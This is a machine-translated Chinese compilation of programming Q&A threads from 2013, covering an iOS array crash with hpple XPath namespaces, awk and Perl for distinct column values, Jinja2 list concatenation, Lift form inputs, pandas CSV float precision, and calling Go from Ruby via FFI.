2013-04-08 10:26:30.604 HTML[12408:11303] *** 由于未捕获的异常“NSRangeException”而终止应用程序，原因：“*** -[__NSArrayM objectAtIndex:]：索引 4 超出范围 [0 .. 3]” *** First throw call stack: (0x210a012 0x1203e7e 0x20ac0b4 0x3852 0x2028fb 0x2029cf 0x1eb1bb 0x1fbb4b 0x1982dd 0x12176b0 0x2706fc0 0x26fb33c 0x2706eaf 0x2372bd 0x17fb56 0x17e66f 0x17e589 0x17d7e4 0x17d61e 0x17e3d9 0x1812d2 0x22b99c 0x178574 0x17876f 0x178905 0x9733ab6 0x181917 0x14596c 0x14694b 0x157cb5 0x158beb 0x14a698 0x2065df9 0x2065ad0 0x207fbf5 0x207f962 0x20b0bb6 0x20aff44 0x20afe1b 0x14617a 0x147ffc 0x1d2d 0x1c55) libc++abi.dylib：终止调用抛出异常

更新 2

通过在我重新加载数据时放入 if 语句来修复错误索引超出范围。我在我的 NSLog 中得到一个数组，但它没有把它放在我的表格视图中。表格视图出现空！！但不会再崩溃了！！！

最后更新

它现在可以工作了，Jens 帮我正确查询了查询，然后我只需要填写表格视图。我将数组计数设置为 20，因为 Ray 的 tut 有无数个条目。我朋友的博客，只有四个！感谢所有的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T14:48:58.667

### 问题：

您的文档包含命名空间：

```
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" xml:lang="en-US"> 
```

### 解决方案：

我不熟悉 hpple 和 ObjectiveC，所以我无法验证我在[这个 hpple github 问题](https://github.com/topfunky/hpple/issues/5)上调整的代码，但它看起来很合理。我想您所要做的就是将第一个参数更改为您的 xpath 上下文变量。

```
xmlXPathRegisterNs(xpathCtx, [@"xhtml" cString],[@"http://www.w3.org/1999/xhtml" cString]); 
```

然后，在每次访问元素时为这个命名空间添加前缀：

```
//xhtml:h2[@class = 'entry-title'] 
```

* * *

如果您不想使用命名空间（并且因为有不同而无需使用），则可以添加通配符命名空间：

```
//*:h2[@class = 'entry-title'] 
```

# unix - 用于识别不同字段值的命令

> ID：15879982
> 
> 赞同：0
> 
> 时间：2013-04-08T13:11:48.730
> 
> 标签：unix

任何人都可以帮助我识别特定列中的不同值吗？

例如，我的输入就像

```
Column1 Column2 Column3
a   11  abc
a   22  abc
b   33  edf
c   44  ghi 
```

我需要像这样的输出

```
Column1
a
b
c 
```

我的输入文件有标题。所以我需要一个命令，我们将 Column1 作为参数传递。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-06-27T08:40:32.460

文件`distinct.pl`：

```
#!/usr/bin/perl
$_ = <STDIN>;
@F = split;
map $col{$F[$_]}=$_, (0..$#F);          # map column names to numbers
while (<STDIN>)
{
    @F = split;
    $val{$F[$col{$ARGV[0]}]} = undef    # implement the set of values
}
$, = "\n";
print $ARGV[0], "";                     # output the column parameter
print sort(keys %val), ""               # output sorted set of values 
```

示例命令：`distinct.pl Column2 <input`

注意：不存在的列名会产生第一列的值。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T13:22:19.393

使用输入文件运行以下命令：

```
$ head -1 input.file | awk '{ print $1}'; awk '{ if (NR > 1) print $1 }' input.file | uniq
Column1
a
b
c 
```

要不就：

```
$ awk '{print $1 }' input.file | uniq
Column1
a
b
c 
```

# python - JINJA2 中的连接列表

> ID：15879983
> 
> 赞同：27
> 
> 时间：2013-04-08T13:11:49.750
> 
> 标签：python, jinja2

如何在 jinja2 中连接两个列表变量？

例如

```
GRP1 = [1, 2, 3]
GRP2 = [4, 5, 6]

{# This works fine: #}
{% for M in GRP1 %}
    Value is {{M}}
{% endfor %}

{# But this does not: #}
{% for M in GRP1 + GRP2 %}
    Value is {{M}}
{% endfor %} 
```

因此，我尝试使用 + 连接两个列表（就像在 Python 中那样），但事实证明它们不是列表，而是 python`xrange`对象：

```
jijna2 error: unsupported operand type(s) for +: 'xrange' and 'xrange' 
```

有没有办法让我在同一个 for 循环中迭代 GRP1 和 GRP2 的串联？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2013-04-08T13:25:13.617

AFAIK 你不能使用本机 Jinja2 模板来做到这一点。您最好创建一个新的组合迭代并将其传递给您的模板，例如：

```
from itertools import chain

x = xrange(3)
y = xrange(3, 7)
z = chain(x, y) # pass this to your template
for i in z:
    print i 
```

根据评论，您可以将可迭代对象显式转换为列表，并将它们连接起来：

```
{% for M in GRP1|list + GRP2|list %} 
```

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2020-01-23T06:17:58.963

`{{ GRP1 + GRP2 }}`在 jinja2 版本 2.9.5 及更高版本中，可以使用类似的连接列表。

@Hsiao 最初作为评论给出了这个答案

# forms - 获取电梯中的复选框和单选按钮值

> ID：15879991
> 
> 赞同：2
> 
> 时间：2013-04-08T13:12:06.843
> 
> 标签：forms, scala, checkbox, radio-button, lift

我正在尝试处理升降框架工作中的表格。我的表单有一个复选框和单选按钮。我如何检查复选框是否被选中以及选中的单选按钮。我用来获取其他元素值的以下代码。

风景：

```
<form class="lift:MySnippet?form=post">
 From:<input type="text" name="source" /><br />
 To:  <input type="text" name="destination" /><br />
 Age: <input type="text" name = "age"/><br />
 Return: <input type="checkbox" name="needreturn" value="Return Ticket" /><br />
 <input type="radio" name="sex" value="male" />Male<br />
 <input type="radio" name="sex" value="male" />Female<br />
 <input type="submit" value="Book Ticket"/>
</form> 
```

MySnippet Scala 代码是：

```
 object MySnippet {
     def render = {
             var from = ""
             var to = ""
             var age = 0

            def process() {
                S.notice("in process function")
            }

     "name=source" #> SHtml.onSubmit(from = _) &
     "name=destination" #> SHtml.onSubmit(to = _) &
     "name=age" #> SHtml.onSubmit(s => asInt(s).foreach(age = _)) &
     "type=submit" #> SHtml.onSubmitUnit(process)        
   }
  } 
```

在这我怎么能处理复选框和单选按钮。任何人都可以帮助我...thanx提前。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T14:01:02.047

使用`SHtml.checkbox`,`SHtml.radio`

顺便说一句，我认为`<input>-s`应该是。`SHtml.text`所以，它们不是按钮——它们是输入。不要忘记使用 firebug 检查网页中生成的 html。（您会看到使用已`input=text`删除的当前代码。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-08T22:59:25.970

您需要在 HTML 中指定选项吗？如果没有，最简单的方法是：

```
Return: <input type="checkbox" name="needreturn" /><br />
Sex: <input type="radio" name="sex" /> 
```

和 CSS 变换：

```
val radioChoices = List("male", "female")
var sex:Box[String] = None
var needReturn:Boolean = false

"@sex" #> SHtml.radio(radioChoices, sex, (resp) => sex = Full(resp)) &
"@needreturn" #> SHtml.checkbox(needReturn, (resp) => needReturn = resp) 
```

如果您希望在每次更改值时将您的选择发送到服务器，而不是在提交表单时，您可以`SHtml.radio`替换为`SHtml.ajaxRadio``SHtml.checkbox``SHtml.ajaxCheckbox`

我相信你也可以`SHtml.onSubmit`像上面那样使用复选框和收音机，但我必须做一些测试才能弄清楚到底是怎么做的。

关于单选按钮，如果需要，您可以在此处找到有关更改标签输出方式的一些信息：[https ://groups.google.com/forum/?fromgroups=#!topic/liftweb/rowpmIDbQAE](https://groups.google.com/forum/?fromgroups=#!topic/liftweb/rowpmIDbQAE)

# python - 在 pandas 中读取和写入 csv 会更改单元格值

> ID：15879992
> 
> 赞同：0
> 
> 时间：2013-04-08T13:12:07.830
> 
> 标签：python, pandas

我刚开始学习 pandas 并注意到一个非常奇怪的行为，读取和写入 csv 文件会更改数据框单元格的值。

前：

```
64437311025 SMP 1   110.00  0.00    498.00  4174.3865   4243.59 4247.69 4424.62 4570.26 3874.36 4516.41 4412.31 4117.44 4215.38 4300.00 4433.85 4065.64 4394.36 1728.00 1675.00 1517.27 1363.23 0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0   0   0   0   0   0   0   0   0   0.00    0   0.00 
```

发出后：

```
df = pd.read_csv(in_file, sep='\t')
df.to_csv(out_file, sep='\t') 
```

我得到：

```
1   64437311025 SMP 1   110.0   0.0 498.0   4174.3864999999996  4243.5900000000001  4247.6899999999996  4424.6199999999999  4570.2600000000002  3874.3600000000001  4516.4099999999999  4412.3100000000004  4117.4399999999996  4215.3800000000001  4300.0  4433.8500000000004  4065.6399999999999  4394.3599999999997  1728.0  1675.0  1517.27 1363.23 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0   0.0 0   0.0 
```

对于我做错的任何建议，我将不胜感激。我正在使用来自 ubuntu 12.10 存储库 (0.8.0) 的 Python (2.7.3) 和 pandas 的标准安装

编辑：我认为这是一个错误：[https](https://github.com/pydata/pandas/issues/2069) ://github.com/pydata/pandas/issues/2069 感谢 user1827356 我找到了 to_csv 方法的 float_format 参数，但要使其工作，我必须安装更新版本的熊猫，因为它在 ubuntu 12.10 的默认 0.8 pandas 中不起作用。现在好了。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T13:32:51.400

您在输出 csv 中看到的值相同，但精度更高。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-10-24T12:57:17.200

例如：

```
df.to_csv('pandasfile.csv', float_format='%.3f') 
```

# ruby - 在 Go (golang) 中编写一个 Ruby 扩展

> ID：15879993
> 
> 赞同：40
> 
> 时间：2013-04-08T13:12:08.313
> 
> 标签：ruby, rubygems, gem, go

是否有一些关于如何在 Go 中为 Ruby 编写扩展的教程或实践课程？

* * *

## 回答 #1

> 赞同：76
> 
> 时间：2013-04-22T02:51:38.113

Go 1.5 添加了对构建可从 C 调用的共享库（因此从 Ruby 通过 FFI）的支持。这使得该过程比 1.5 之前的版本更容易（当需要编写 C 粘合层时），并且 Go 运行时现在可用，这使得它在现实生活中真正有用（以前不可能使用 goroutines 和内存分配，因为它们需要 Go 运行时，如果 Go 不是主要入口点，则该运行时不可用）。

goFuncs.go:

```
package main

import "C"

//export GoAdd
func GoAdd(a, b C.int) C.int {
    return a + b
}

func main() {} // Required but ignored 
```

请注意，`//export GoAdd`每个导出的函数都需要注释；后面的符号`export`是函数的导出方式。

goFromRuby.rb:

```
require 'ffi'

module GoFuncs
  extend FFI::Library
  ffi_lib './goFuncs.so'
  attach_function :GoAdd, [:int, :int], :int
end

puts GoFuncs.GoAdd(41, 1) 
```

该库是用以下内容构建的：

```
go build -buildmode=c-shared -o goFuncs.so goFuncs.go 
```

运行 Ruby 脚本会产生：

```
42

```

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2013-04-17T22:56:52.340

通常我会尽量给你一个直接的答案，但到目前为止的评论显示可能没有答案。因此，希望这个带有通用解决方案的答案和其他一些可能性是可以接受的。

一种通用解决方案：将高级语言程序编译为可从 C 调用的库。为 Ruby 包装它。在这一点上，人们必须非常小心地进行整合。这个技巧是过去集成许多语言的一个很好的组合，通常是出于遗留原因。问题是，我不是 Go 开发人员，我不知道你可以将 Go 编译成可以从 C 调用的东西。继续前进。

创建两个独立程序：Ruby 和 Go 程序。在程序中，使用一种非常有效的方式来回传递数据。该扩展将简单地建立与 Go 程序的连接、发送数据、等待结果并将结果传递回 Ruby。通信通道可能是 OS IPC、套接字等。无论它们都支持什么。如果没有安全问题并且您使用的是预定义的消息格式，则数据格式可以非常简单。这进一步提高了速度。我的一些旧程序将 XDR 用于二进制格式。如今，人们似乎使用 JSON、Protocol Buffers 和 ZeroMQ 风格的有线协议之类的东西。

第二个建议的变化：使用 ZeroMQ！或类似的东西。ZeroMQ 快速、健壮并且具有两种语言的绑定。它为您管理上述整个段落。缺点是它在性能调整方面不太灵活，并且有你不需要的额外东西。

使用两个进程并在它们之间传递数据的棘手部分是速度损失。开销可能不足以成为离开 Ruby 的理由。但是，Go 具有出色的本机性能和并发特性，这可能证明在其中编写应用程序的一部分而不是像 Ruby 这样的脚本语言是合理的。（可能是您提出问题的理由之一。）因此，请尝试每种策略。如果您获得的工作程序也更快，请使用它。否则，请坚持使用 Ruby。

可能不太吸引人的选项：使用 Go 以外的其他具有类似优势的东西，允许从 C 调用，并且可以集成。尽管它不是很受欢迎，但 Ada 是一种可能性。它在本机代码、（受限）并发性、可靠性、低级支持、跨语言开发和 IDE (GNAT) 方面一直很强大。此外，Julia 是一种用于高性能技术和并行编程的新语言，可以编译成可从 C 调用的库。它也有 JIT。也许将问题陈述从 Ruby+Go 更改为 Ruby+（更合适的语言）会解决问题？

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2015-09-15T21:18:27.327

从 Go 1.5 开始，有一个新的构建模式告诉 Go 编译器输出一个共享库和一个 C 头文件：

```
-buildmode c-shared 
```

（这在这个有用的教程中有更详细的解释：http: [//blog.ralch.com/tutorial/golang-sharing-libraries/](http://blog.ralch.com/tutorial/golang-sharing-libraries/)）

使用新的构建模式，您不再需要自己编写 C 粘合层（如之前的回复中所建议的那样）。获得共享库和头文件后，您可以继续使用 FFI 调用 Go 创建的共享库（示例：[https ://www.amberbit.com/blog/2014/6/12/calling- c-cpp-from-ruby/](https://www.amberbit.com/blog/2014/6/12/calling-c-cpp-from-ruby/) )